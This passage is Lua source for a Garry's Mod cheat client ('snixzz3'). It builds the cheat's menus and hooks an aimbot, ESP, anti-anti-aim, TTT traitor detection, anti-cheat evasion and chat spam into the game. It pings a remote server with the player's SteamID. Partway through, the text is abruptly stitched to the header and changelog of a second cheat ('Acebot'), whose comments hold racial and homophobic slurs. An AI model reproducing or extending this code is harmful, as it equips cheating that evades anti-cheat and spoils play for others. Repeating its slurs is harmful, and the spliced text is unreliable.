				Enemies:RemoveLine( line ) 
				snixzz.Sound()
				
			end 
			
		end
		
	end
	
	AddFriend.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, AddFriend:GetWide(), AddFriend:GetTall() )
		
	end
	
	local RemoveFriend = G.vgui.Create( "DButton", tabs.lists ) 
	RemoveFriend:SetText("<--") 
	RemoveFriend:SetSize( 30, 20 ) 
	RemoveFriend:SetPos( 187.5, 165 )
	RemoveFriend:SetTextColor( color_white )
	RemoveFriend.DoClick = function() 
	
		local line = Friends:GetSelectedLine() 
		
		if line != nil then 
			
			local ply = Friends:GetLine( line ):GetValue( 1 ) 
			
			if snixzz.Friends[ply] then
			
				for k, v in G.next, snixzz.Friends do 
					
					if k == ply then 
						
						snixzz.Friends[k] = nil
						snixzz.Chat( snixzz.Colors.Red, "Removed '" .. ply .. "' from the friends list." )
						snixzz.Sound()
						
					end 
					
				end 
				
				Enemies:AddLine( ply ) 
				Friends:RemoveLine( line )
				
			end
			
		end 
		
	end 
	
	RemoveFriend.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, RemoveFriend:GetWide(), RemoveFriend:GetTall() )
		
	end
	
	local AllEnts = G.vgui.Create( "DListView", tabs.lists )
	AllEnts:SetPos( 5, 190 )
	AllEnts:SetSize( 170, 180 )
	AllEnts:AddColumn( "All Entities" )
	
	local addedEnts = {}
	
	for k, v in G.next, G.ents.GetAll() do
	
		if !addedEnts[v:GetClass()] && !v:IsPlayer() && !v:IsNPC() && !snixzz.Entities[v:GetClass()] && !snixzz.BadEntities[v:GetClass()] then
	
			AllEnts:AddLine( v:GetClass() )
			addedEnts[v:GetClass()] = true
			
		end
		
	end
	
	local DrawEnts = G.vgui.Create( "DListView", tabs.lists )
	DrawEnts:SetPos( 230, 190 )
	DrawEnts:SetSize( 170, 180 )
	DrawEnts:AddColumn( "Entities to Draw" )
	
	for k, v in G.next, snixzz.Entities do
		
		DrawEnts:AddLine( k )
		
	end
	
	local AddEntity = G.vgui.Create( "DButton", tabs.lists ) 
	AddEntity:SetText( "-->" ) 
	AddEntity:SetSize( 30, 20 )
	AddEntity:SetPos( 187.5, 315 )
	AddEntity:SetTextColor( color_white )
	AddEntity.DoClick = function() 
	
	local line = AllEnts:GetSelectedLine()
		
		if line != nil then 
			
			local ent = AllEnts:GetLine( line ):GetValue(1)  
			
			if !snixzz.Entities[ply] then
				
				snixzz.Entities[ent] = true
				snixzz.Chat( snixzz.Colors.Green, "Added '" .. ent .. "' to entities list." )
				DrawEnts:AddLine( ent ) 
				AllEnts:RemoveLine( line ) 
				snixzz.Sound()
				
			end 
			
		end
		
	end
	
	AddEntity.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, AddEntity:GetWide(), AddEntity:GetTall() )
		
	end
	
	local RemoveEntity = G.vgui.Create( "DButton", tabs.lists ) 
	RemoveEntity:SetText("<--") 
	RemoveEntity:SetSize( 30, 20 ) 
	RemoveEntity:SetPos( 187.5, 350 )
	RemoveEntity:SetTextColor( color_white )
	RemoveEntity.DoClick = function() 
	
		local line = DrawEnts:GetSelectedLine() 
		
		if line != nil then 
			
			local ent = DrawEnts:GetLine( line ):GetValue( 1 ) 
			
			if snixzz.Entities[ent] then
			
				for k, v in G.next, snixzz.Entities do 
					
					if k == ent then 
						
						snixzz.Entities[k] = nil
						snixzz.Chat( snixzz.Colors.Red, "Removed '" .. ent .. "' from the entities list." )
						snixzz.Sound()
						
					end 
					
				end 
				
				AllEnts:AddLine( ent ) 
				DrawEnts:RemoveLine( line )
				
			end
			
		end 
		
	end 
	
	RemoveEntity.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, RemoveEntity:GetWide(), RemoveEntity:GetTall() )
		
	end
	
	-----------------
	--  Log Tab    --
	-----------------
	
	snixzz.LogTab = G.vgui.Create( "DListView", tabs.log )
	snixzz.LogTab:SetPos( 5, 5 )
	snixzz.LogTab:SetSize( snixzz.Frame:GetWide() - 25, snixzz.Frame:GetTall() - 70 )
	snixzz.LogTab:AddColumn( "snixzz3 Logs" )
	snixzz.LogTab:SetSortable( false )
	snixzz.LogTab:SetMultiSelect( false )
	
	for k, v in G.next, snixzz.Lines do
		snixzz.LogTab:AddLine( v )
		
	end
	
	snixzz.LogTab.OnClickLine = function( parent, line, isselected )
		
		G.SetClipboardText( line:GetValue( 1 ) )
		
	end
	
	local ConsoleClear = G.vgui.Create( "DButton", tabs.log ) 
	ConsoleClear:SetText( "Clear Log" ) 
	ConsoleClear:SetSize( snixzz.Frame:GetWide() - 25, 23 )
	ConsoleClear:SetPos( 5, 370 )
	ConsoleClear:SetTextColor( color_white )
	
	ConsoleClear.DoClick = function() 
	
		snixzz.Lines = {}
		snixzz.LogTab:Clear()
		
	end 
	
	ConsoleClear.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, ConsoleClear:GetWide(), ConsoleClear:GetTall() )
		
	end
	
	----------------
	-- Config Tab --
	----------------
	--Menu Settings
	snixzz.CreateOption( "Label", tabs.config, "Menu Color", 230, 5 )
	
	local MenuColor = G.vgui.Create( "DColorMixer", tabs.config )
	MenuColor:SetPos( 230, 20 ) 
	MenuColor:SetSize( 170, 100 )
	MenuColor:SetPalette( false )
	MenuColor:SetAlphaBar( true )
	MenuColor:SetWangs( false )
	MenuColor:SetColor( snixzz.Vars["misc_menucolor"] )
	
	MenuColor.ValueChanged = function()
		
		snixzz.Vars["misc_menucolor"] = MenuColor:GetColor()
		
	end
	
	snixzz.CreateOption( "Label", tabs.config, "Secondary Menu Color", 230, 125 )
	
	local MenuColor2 = G.vgui.Create( "DColorMixer", tabs.config )
	MenuColor2:SetPos( 230, 140 ) 
	MenuColor2:SetSize( 170, 100 )
	MenuColor2:SetPalette( false )
	MenuColor2:SetAlphaBar( true )
	MenuColor2:SetWangs( false )
	MenuColor2:SetColor( snixzz.Vars["misc_menucolor2"] )
	
	MenuColor2.ValueChanged = function()
		
		snixzz.Vars["misc_menucolor2"] = MenuColor2:GetColor()
		
	end
	
	snixzz.CreateOption( "Label", tabs.config, "Laser Color", 230, 245 )
	
	local LaserCol = G.vgui.Create( "DColorMixer", tabs.config )
	LaserCol:SetPos( 230, 260 ) 
	LaserCol:SetSize( 170, 100 )
	LaserCol:SetPalette( false )
	LaserCol:SetAlphaBar( false )
	LaserCol:SetWangs( false )
	LaserCol:SetColor( snixzz.Vars["misc_lasercolor"] )
	
	LaserCol.ValueChanged = function()
		
		snixzz.Vars["misc_lasercolor"] = LaserCol:GetColor()
		
	end
	
	local CfgList = G.vgui.Create( "DListView", tabs.config ) 
	CfgList:SetPos( 5, 5 ) 
	CfgList:SetMultiSelect( false ) 
	CfgList:SetSize( 220, 80 )
	CfgList:AddColumn( "Config" ) 
	
	for k, v in G.next, snixzz.Configs do 
		
		CfgList:AddLine( v ) 
		
	end 
	
	CfgList.DoDoubleClick = function() 
		
		local line = CfgList:GetSelectedLine() 
		
		if line != nil then 
		
			local config = CfgList:GetLine( line ):GetValue( 1 ) 
			snixzz.LoadConfig( config ) 
			snixzz.Sound()
			
		end 
		
	end 
		
	-- Right from gInject. Im lazy with menus. I'll re-write it later
	local CreateConfig = G.vgui.Create( "DButton", tabs.config ) 
	CreateConfig:SetText( "Create New" ) 
	CreateConfig:SetSize( 105, 30 )
	CreateConfig:SetPos( 5, 90 )
	CreateConfig:SetTextColor( color_white )
	CreateConfig.DoClick = function() 
	
		G.Derma_StringRequest( "New Config", "Name of the new config", "", function( txt ) 
		
			snixzz.SaveConfig( txt ) 
			snixzz.Sound()
			
		end )
		
	end 
	
	CreateConfig.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, CreateConfig:GetWide(), CreateConfig:GetTall() )
		
	end
	
	local RenameConfig = G.vgui.Create( "DButton", tabs.config ) 
	RenameConfig:SetText( "Rename" ) 
	RenameConfig:SetSize( 105, 30 )
	RenameConfig:SetPos( 5, 125 )
	RenameConfig:SetTextColor( color_white )
	RenameConfig.DoClick = function()
		
		G.Derma_StringRequest( "Rename Config", "Name of the new config", "", function( NewConfig ) 
			
			local line = CfgList:GetSelectedLine() 
			
			if line != nil then 
				
				local OldConfig = CfgList:GetLine( line ):GetValue( 1 ) 
				
				if OldConfig != "default" then
				
					snixzz.RenameConfig( OldConfig, NewConfig )
					G.table.remove( snixzz.Configs, CfgList:GetSelectedLine() )
					G.table.insert( snixzz.Configs, NewConfig )
					snixzz.Sound()
					
				end
				
			end
			
		end )
		
	end
	
	RenameConfig.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, RenameConfig:GetWide(), RenameConfig:GetTall() )
		
	end
	
	local DeleteConfig = G.vgui.Create( "DButton", tabs.config ) 
	DeleteConfig:SetText( "Delete" ) 
	DeleteConfig:SetSize( 105, 30 )
	DeleteConfig:SetPos( 118, 90 )
	DeleteConfig:SetTextColor( color_white )
	DeleteConfig.DoClick = function() 
	
		local line = CfgList:GetSelectedLine() 
		
		if line != nil then
			
			local config = CfgList:GetLine( line ):GetValue( 1 ) 
			if config != "default" then
			
				for k, v in G.next, snixzz.Configs do 
					
					if v == config then 
					
						snixzz.DeleteConfig( config )
						G.table.remove( snixzz.Configs, k ) 
						snixzz.Sound()
						
					end 
					
				end
				
			end
			
		end 
		
	end 
	
	DeleteConfig.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, DeleteConfig:GetWide(), DeleteConfig:GetTall() )
		
	end
	
	
	local LoadConfig = G.vgui.Create( "DButton", tabs.config ) 
	LoadConfig:SetText( "Load" ) 
	LoadConfig:SetSize( 105, 30 )
	LoadConfig:SetPos( 118, 125 )
	LoadConfig:SetTextColor( color_white )
	LoadConfig.DoClick = function()
	
		local line = CfgList:GetSelectedLine() 
		
		if line != nil then 
			local config = CfgList:GetLine( line ):GetValue( 1 ) 
			snixzz.LoadConfig( config )
			snixzz.Frame:SetVisible( false )
			//snixzz.Changelog:SetVisible( false )
			//snixzz.LinksButton:SetVisible( false )
			snixzz.MenuOpen = false
			snixzz.MenuToggle = false
			snixzz.Sound()
			
		end
		
	end
	
	LoadConfig.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, LoadConfig:GetWide(), LoadConfig:GetTall() )
		
	end
	
	local SetDefaultCfg = G.vgui.Create( "DButton", tabs.config ) 
	SetDefaultCfg:SetText( "Set Default" ) 
	SetDefaultCfg:SetSize( 105, 30 )
	SetDefaultCfg:SetPos( 118, 160 )
	SetDefaultCfg:SetTextColor( color_white )
	SetDefaultCfg.DoClick = function()
	
		local line = CfgList:GetSelectedLine() 
	
		if line != nil then 
		
			local config = CfgList:GetLine( line ):GetValue( 1 ) 
			
			snixzz.SetDefaultConfig( config )
			snixzz.LoadConfig( config )
			snixzz.Sound()
			
		end
		
	end	
	
	SetDefaultCfg.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, SetDefaultCfg:GetWide(), SetDefaultCfg:GetTall() )
		
	end
		
	local UpdateConfig = G.vgui.Create( "DButton", tabs.config ) 
	UpdateConfig:SetText( "Save Changes" ) 
	UpdateConfig:SetSize( 105, 35 )
	UpdateConfig:SetPos( 118, 195 )
	UpdateConfig:SetTextColor( color_white )
	UpdateConfig.DoClick = function()
		
		snixzz.Sound()
		snixzz.UpdateConfig()
		
	end	
	
	UpdateConfig.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, UpdateConfig:GetWide(), UpdateConfig:GetTall() )
		
	end
		
	// Binds
	local BindCommands = G.vgui.Create( "DComboBox", tabs.config )
	BindCommands:SetPos( 5, 160 )
	BindCommands:SetSize( 105, 20 )
	BindCommands:SetTextColor( color_white )
	
	for k, v in G.next, snixzz.Binds do
		
		BindCommands:AddChoice( k )
		
	end
	
	BindCommands.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, BindCommands:GetWide(), BindCommands:GetTall() )
		
	end
	
	local BindKeys = G.vgui.Create( "DComboBox", tabs.config )
	BindKeys:SetPos( 5, 185 )
	BindKeys:SetSize( 105, 20 )
	BindKeys:SetTextColor( color_white )
	
	for k, v in G.next, snixzz.Keys do
		
		BindKeys:AddChoice( v.Name )
		
	end
	
	BindKeys.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, BindKeys:GetWide(), BindKeys:GetTall() )
		
	end
	
	local RebindKey = G.vgui.Create( "DButton", tabs.config ) 
	RebindKey:SetText( "Bind" ) 
	RebindKey:SetSize( 105, 20 )
	RebindKey:SetPos( 5, 210 )
	RebindKey:SetTextColor( color_white )
	RebindKey.DoClick = function() 
		
		local Key = BindKeys:GetValue()
		local Command = BindCommands:GetValue()
		
		if ( BindKeys:GetValue() != "" && BindCommands:GetValue() != "" ) then
			
			snixzz.Frame:SetVisible( false )
			//snixzz.Changelog:SetVisible( false )
			//snixzz.LinksButton:SetVisible( false )
			snixzz.MenuOpen = false
			snixzz.MenuToggle = false
			snixzz.BindKey( Command, Key )
			snixzz.Sound()
			
		end
		
	end
	
	RebindKey.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, RebindKey:GetWide(), RebindKey:GetTall() )
		
	end
	
	local JoinHvH = G.vgui.Create( "DButton", tabs.config ) 
	JoinHvH:SetText( "Join OFFICIAL Hack VS Hack Server" ) 
	JoinHvH:SetSize( 218, 30 )
	JoinHvH:SetPos( 5, 235 )
	JoinHvH:SetTextColor( color_white )
	JoinHvH:SetFont( "snixzz_logo_small" )
	JoinHvH.DoClick = function()
		
		Derma_Query( 
		
		"Would you like to join Hack VS Hack?", "Join Hack VS Hack", 
		
		"Yes", function() 
			
			snixzz.Chat( Color( 255, 0, 0 ), "Connecting in 15 seconds. If you're missing the map you can simply Google 'aim_ag_texture2' & download it anywhere." )
			
			timer.Simple( 15, function()
			
				G.LocalPlayer():ConCommand( "connect 66.150.164.192:27015" )
			
			end )
			
		end,
		
		"No", function()

			snixzz.Chat( Color( 0, 255, 255 ), "Hack VS Hack is a great place to test & configure your cheat or compete against other cheaters!" )
		
		end )
		
	end	
	
	JoinHvH.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, JoinHvH:GetWide(), JoinHvH:GetTall() )
		
	end
	
	snixzz.Changelog = G.vgui.Create( "DButton", tabs.config )
	snixzz.Changelog:SetText( "Changelog and News" )
	snixzz.Changelog:SetPos( 5, 270 )
	snixzz.Changelog:SetSize( 218, 30 )
	snixzz.Changelog:SetFont( "snixzz_logo" )
	snixzz.Changelog:SetTextColor( color_white )
	
	snixzz.Changelog.DoClick = function()
		
		if !snixzz.CFrame then
		
			snixzz.Sound()
			snixzz.CMenu()
			
		end
		
	end
	snixzz.Changelog.Paint = function() 
		
		//G.draw.RoundedBox( 0, 0, 0, snixzz.Changelog:GetWide(), snixzz.Changelog:GetTall(), Color( 40, 40, 40, 145 ) )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, snixzz.Changelog:GetWide(), snixzz.Changelog:GetTall() )
		
	end
	
	snixzz.CreateOption( "Checkbox", tabs.config, "Load with GAMEMODE hooks (Buggy, may break parts of gamemode)", "load_unhooked", 5, 375 )
	
end

/*
	
	Open Steam Group & Forum once
	
*/

/*
function snixzz.RequestLinks()
	
	G.Derma_Query( "snixzz.net is expanding!\nWe've re-opened our forums and a Steam group, please take a look & consider joining!", "[snixzz.net] Join us!",
	"Okay!", function()
		
		snixzz.OpenLinksMenu()
		
	end )
	
end

function snixzz.OpenLinksMenu()
	
	snixzz.linksMenu = G.vgui.Create( "DFrame" )
	snixzz.linksMenu:SetSize( 260, 60 )
	snixzz.linksMenu:Center()
	snixzz.linksMenu:SetTitle( "Links" )
	snixzz.linksMenu:ShowCloseButton( false )
	snixzz.linksMenu:MakePopup()
	snixzz.linksMenu.Paint = function( self ) 
	
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), snixzz.Vars["misc_menucolor2"] )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
		
	end
	
	local close = G.vgui.Create( "DButton", snixzz.linksMenu )
	close:SetSize( 50, 20 )
	close:SetPos( snixzz.linksMenu:GetWide() - 51, 1 )
	close:SetText( "x" )
	close:SetTextColor( G.Color( 255, 255, 255 ) )
	close:SetFont( "Trebuchet18" )
	
	close.Paint = function()
	
		G.draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
	
	end
	
	close.DoClick = function()
		
		snixzz.linksMenu:Close()
		snixzz.Sound()
		snixzz.linksMenu = nil
		
	end
	
	local website = G.vgui.Create( "DButton", snixzz.linksMenu )
	website:SetSize( 120, 30 )
	website:SetPos( 5, 25 )
	website:SetText( "Forums" )
	website:SetTextColor( color_white )
	
	website.Paint = function() 
		
		G.surface.SetDrawColor( Color( 230, 30, 30 ) )
		G.surface.DrawOutlinedRect( 0, 0, website:GetWide(), website:GetTall() )
		
	end
	
	website.DoClick = function( self )
		
		G.gui.OpenURL( "https://bit.ly/1UiOwAC" )
		
	end
	
	local group = G.vgui.Create( "DButton", snixzz.linksMenu )
	group:SetSize( 120, 30 )
	group:SetPos( 130, 25 )
	group:SetText( "Steam Group" )
	group:SetTextColor( color_white )
	
	group.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 255, 153 ) )
		G.surface.DrawOutlinedRect( 0, 0, group:GetWide(), group:GetTall() )
		
	end
	
	group.DoClick = function( self )
		
		G.gui.OpenURL( "https://bit.ly/1VzMroY" )
		
	end
	
end

if !G.file.Exists( snixzz.DataFolder .. "/asktojoin.txt", "DATA" ) then
	
	snixzz.RequestLinks()
	
	file.Write( snixzz.DataFolder .. "/asktojoin.txt", "Confirmed, asked to join website/steam group on " .. G.os.date() .. "\n" )
	
end
*/

/*

	Hooking & loading.
	
*/

function snixzz.LoadHooks()

	snixzz.GMHooks = { -- Return the server's original hooks for selected types
		
		["CreateMove"] = GAMEMODE.CreateMove,
		["HUDPaint"] = GAMEMODE.HUDPaint,
		["StartChat"] = GAMEMODE.StartChat,
		["FinishChat"] = GAMEMODE.FinishChat,
		["PlayerTraceAttack"] = GAMEMODE.PlayerTraceAttack,
		["RenderScene"] = GAMEMODE.RenderScene,

	}
	
	function GAMEMODE:RenderScene()
	
		if snixzz.Bools["aim_antiantiaim"] then
		
			snixzz.AAA()
			
		end
	
	end
	
	function GAMEMODE:PlayerTraceAttack( ent, dmg, dir, trace )
	
		local hit = trace.HitPos
		local start = trace.StartPos
		
		G.table.insert( snixzz.Bullets, { hit, start, 5, Color( 255, 0, 0, 255 ), snixzz.Angles } )
		
		return snixzz.GMHooks["PlayerTraceAttack"]( ent, dmg, dir, trace )
		
	end
	
	function GAMEMODE:PostDraw2DSkyBox()
	
		if !snixzz.Bools["esp_asus_walls"] then return end
		
		G.render.Clear( 0, 0, 0, 255 )
		
	end
	
	function GAMEMODE:PreDrawSkyBox()
	
		if !snixzz.Bools["esp_asus_walls"] then return end
		
		G.render.Clear( 0, 0, 0, 255 )
		
		return true
		
	end

	function GAMEMODE:StartChat() 
		
		snixzz.Typing = true
		
		return snixzz.GMHooks.StartChat() 
	end 

	function GAMEMODE:FinishChat() 
		
		snixzz.Typing = false 
		
		return snixzz.GMHooks.FinishChat()
	end 

	function GAMEMODE:ShouldDrawLocalPlayer( ply )
		
		return snixzz.Bools["misc_thirdperson"]
		
	end

	if snixzz.Bools["load_unhooked"] then

		function GAMEMODE:CreateMove( ucmd )
			
			snixzz.CreateMove( ucmd )
			
			return snixzz.GMHooks.CreateMove( ucmd )
		end

		function GAMEMODE:HUDPaint( self, ... )
			
			snixzz.HUDPaint()
			
			return snixzz.GMHooks.HUDPaint( self, ... )
		end

		function GAMEMODE:CalcView( ply, origin, angles, fov )
		
			return snixzz.CalcView( ply, origin, angles, fov )
			
		end

		function GAMEMODE:Move()
		
			return snixzz.Move()
			
		end
		
		snixzz.AddToConsole( "Hooking functions into the gamemode's hook system." )
		
	else

		snixzz.AddHook( "CreateMove", snixzz.CreateMove )
		snixzz.AddHook( "HUDPaint", snixzz.HUDPaint )
		snixzz.AddHook( "CalcView", snixzz.CalcView )
		snixzz.AddHook( "Move", snixzz.Move )
		
		snixzz.AddToConsole( "Loading unsecured hooks. More detectable but more reliable." )
		
	end
	
end

function snixzz.PingServer( ply ) -- This was overly complicated & I ended up having to do it a really dumb way for now.

	snixzz.AddToConsole( "Attempting to ping snixzz server" )

	G.http.Fetch( "http://snixzz.net/cheats/snixzz3/ping.php?steamid=" .. ply:SteamID64(), 
		
		function( body )
			
			snixzz.AddToConsole( "snixzz server responded to ping with '" .. body .. "'" )
			
			if body == "Error: Retry" then
				
				snixzz.PingServer( LocalPlayer() )
				
			end
			
		end,
			
		function( error )
			
			snixzz.AddToConsole( "ping received, pinging server again in 250 seconds." )
			
			G.timer.Simple( 250, function()
	
				snixzz.PingServer( LocalPlayer() )
				
			end )
			
		end
		
	)

end

function snixzz.CreateTimers() 
	
	if snixzz.IsTTT then

		snixzz.RegisterTimer( 10, 0, snixzz.GetTraitors )
		
	end

	/*if snixzz.IsDarkRP then
		
		snixzz.RegisterTimer( 10, 0, snixzz.Namechanger )
		
	else
		
		snixzz.RegisterTimer( G.GetConVarNumber( "sv_namechange_cooldown_seconds" ) + 0.5, 0, snixzz.Namechanger )
		
	end*/

	snixzz.RegisterTimer( 1, 0, snixzz.ChatSpam )
	
end

function snixzz.LoadAllFunctions()
	
	snixzz.UpdateChangelog()
	
	snixzz.FileSystem()
	
	snixzz.Configs = snixzz.GetConfigs()
	
	if !snixzz.ConfigExists( "default" ) then
		
		snixzz.SaveConfig( "default" )
	
	end
	
	snixzz.UpdateAllConfigs()

	snixzz.LoadConfig( snixzz.DefaultConfig, true )	
	
	snixzz.AntiCheats()
	snixzz.CreateDetours()
	snixzz.LoadModules()
	snixzz.CreateTimers() 
	snixzz.LoadHooks()
	
	snixzz.PingServer( LocalPlayer() )

end

function snixzz.Ban( ply, bantype )

	if bantype == "ip" then
		
		snixzz.Chat( Color( 255, 0, 0 ), "You have been IP banned from the snixzz.net services." )
		
	elseif bantype == "id" then
		
		snixzz.Chat( Color( 255, 0, 0 ), "You have been banned from the snixzz.net services." )
		
	end
	
	if snixzz.loadFrame && snixzz.loadProgress then
	
		snixzz.loadProgress:SetFraction( 1 )
		
		snixzz.loadFrame:SetTitle( "Banned." )	
		
		snixzz.loadFrame:Close() 
		snixzz.loadProgress = nil 
		snixzz.loadFrame = nil
					
		gui.EnableScreenClicker( false )
		
	end

		
	if _G.snixzz then _G.snixzz = nil end
		
end

function snixzz.LoadCheat( bool )
	
	if snixzz.loadProgress then
	
		snixzz.loadProgress:SetFraction( 0.4 )
		snixzz.loadFrame:SetTitle( "Logged in, sending stats." )
		
	end
	/*
	if snixzz.Banned then
		
		snixzz.Ban( LocalPlayer(), "id" )
		
		return
		
	end
	
	snixzz.Stats( LocalPlayer(), true, function()
		
		G.chat.AddText( "\n\n\n\n" )
		
		if bool then
			
			snixzz.Chat( Color( 255, 0, 0 ), "Failed to connect to login server, running as guest." )

		end
		
		--snixzz.logEvent( "Load", "Playing " .. GAMEMODE.Name .. " on " .. GetHostName() )
		
		snixzz.Chat( snixzz.Colors.Green, "Press '" .. G.input.GetKeyName( snixzz.Binds["+menu"] ) .. "' to open the menu & hold TAB+Q to open the console." )
		
		G.chat.AddText( 
		snixzz.Colors.DarkRed, "[snixzz3] ",
		snixzz.Colors.Cyan, "Loaded lua. ",
		snixzz.Colors.Purple, snixzz.Info.Version .. ", ",
		snixzz.Colors.White, "Last updated ",
		snixzz.Colors.Green, snixzz.Info.Updated .. ", ",
		Color( 255, 255, 0 ), snixzz.Info.Size .. ", ",
		Color( 0, 100, 240 ), snixzz.Info.Lines .. " ",
		snixzz.Colors.White, "lines long. ", 
		snixzz.Colors.Green, "Membership Status: ",
		color_white, snixzz.Membership )
		
		snixzz.Chat( snixzz.Colors.Cyan, "Try out our new chat system by pressing '" .. G.input.GetKeyName( snixzz.Binds["chat"] ) .. "' or typing 'chat' in your snixzz3 console." )
		
		snixzz.Sound()
		
		snixzz.Users = {}
		
		// Some shit
		for k, v in G.next, G.player.GetAll() do
			
			if v != G.LocalPlayer() then
				
				if snixzz.IsDev( v ) then
						
					snixzz.Chat( Color( 0, 255, 255 ), "The developer of snixzz3 is on the server! Suck " .. v:Nick() .. "'s cock!" ) -- im a faggot
						
				end
				
			end
			
		end
		
		snixzz.loadProgress:SetFraction( 1 )
		
		snixzz.loadFrame:SetTitle( "Done!" )
		
		G.timer.Simple( 0.5, function() 
			
			snixzz.loadFrame:Close() 
			snixzz.loadProgress = nil 
			snixzz.loadFrame = nil

			gui.EnableScreenClicker( false )
			

				
			snixzz.LoadAllFunctions()


			
		end )
		
	end )
		*/
		G.chat.AddText( "\n\n\n\n" )
		

		snixzz.Chat( snixzz.Colors.Green, "Press '" .. G.input.GetKeyName( snixzz.Binds["+menu"] ) .. "' to open the menu & hold TAB+Q to open the console." )
		
		G.chat.AddText( 
		snixzz.Colors.DarkRed, "[snixzz3] ",
		snixzz.Colors.Cyan, "Loaded lua. ",
		snixzz.Colors.Purple, snixzz.Info.Version .. ", ",
		snixzz.Colors.White, "Last updated ",
		snixzz.Colors.Green, snixzz.Info.Updated .. ", ",
		Color( 255, 255, 0 ), snixzz.Info.Size .. ", ",
		Color( 0, 100, 240 ), snixzz.Info.Lines .. " ",
		snixzz.Colors.White, "lines long. ", 
		snixzz.Colors.Green, "Membership Status: ",
		color_white, snixzz.Membership )
		
		snixzz.Chat( snixzz.Colors.Cyan, "Try out our new chat system by pressing '" .. G.input.GetKeyName( snixzz.Binds["chat"] ) .. "' or typing 'chat' in your snixzz3 console." )
		
		snixzz.Sound()
		
		snixzz.Users = {}
		
			snixzz.loadFrame:Close() 
			snixzz.loadProgress = nil 
			snixzz.loadFrame = nil

			gui.EnableScreenClicker( false )
			
			snixzz.LoadAllFunctions()
	
end

snixzz.Login( LocalPlayer())

end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Odium" )
DermaButton:SetPos( 0, 90 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	local s, odium = pcall( collectgarbage, 'odium' ) /*=======================================================================



   ▄████████  ▄████████    ▄████████ ▀█████████▄   ▄██████▄      ███     

  ███    ███ ███    ███   ███    ███   ███    ███ ███    ███ ▀█████████▄ 

  ███    ███ ███    █▀    ███    █▀    ███    ███ ███    ███    ▀███▀▀██ 

  ███    ███ ███         ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███     ███   ▀ 

▀███████████ ███        ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███     ███     

  ███    ███ ███    █▄    ███    █▄    ███    ██▄ ███    ███     ███     

  ███    ███ ███    ███   ███    ███   ███    ███ ███    ███     ███     

  ███    █▀  ████████▀    ██████████ ▄█████████▀   ▀██████▀     ▄████▀   

                                                                         

A revolutionary lua multihack created by LegendofRobbo

Designed for usage with Project Odium

Lick my taint dumb nigger



Copyrighted by MingeTec Inc - putting pubbies their place since 2013



=======================================================================*/



--local odium = jit.status( "_O" )



local AB = AB or {}

/*

AB.Version = "1.10 - May 26 2017"

AB.LatestChanges = {

    "More reliable targeting on aimbot, shouldn't snap to random targets anymore",

    "Added spectator detection window, moved spectator and witness detection to utility tab",

    "Added file protection for the acebot settings file",

    "Improved ent marker with class searching algorithm",

    "Added invalid's cac UD bhop script",

    "Added sticky targeting setting to aimbot",

    "Namestealer no longer saves between sessions",

    "Added big secret feature",

}

*/

AB.Version = "1.11 - Jul 04 2017"

AB.LatestChanges = {

    "Rewrote xray core to be 100% screengrab safe",

    "Changed notification system over to aegis.Notify",

    "Minor performance tweaks",

}



MsgC( Color( 0, 150, 250 ), "==========>----- Acebot Initialized (Version "..AB.Version..") -----<==========\n" )

MsgC( Color( 0, 150, 250 ), "Latest Changes:\n" )

for k, v in SortedPairs(AB.LatestChanges, false) do

    MsgC( Color( 150, 200, 250 ), v.."\n" )



end



AB.Changelog = {

    " ===== 1.09 (May 11 2017) ===== ",

    "Fixed silent aim to have proper movement correction",

    "Added aimbot auto-trigger setting",

    "Made aimbot kick into rage mode targeting at 180 FOV (experimental)",

    "Added in-hud freecam",

    " ===== 1.08 (Apr 28 2017) ===== ",

    "Rewrote aimbot core systems to be faster, more efficient and more stable",

    "Made silent aim correctly choke bsendpacket",

    "Added adaptive body targeting",

    "Deprecated aegis_printlogs",

    "Made everything on ESP derender when offscreen to boost fps",

    " ===== 1.07 (Apr 21 2017) ===== ",

    "Stopped aimbot from locking on to spawn protected players in darkrp",

    "Added darkrp arrest dodger",

    "Added random rpname on death option",

    "Added suicide when physgunned option",

    "Added ace_base_set, ace_base_remove and ace_base_setsize",

    " ===== 1.06 (Apr 5 2017) ===== ",

    "Added promotional chatspam",

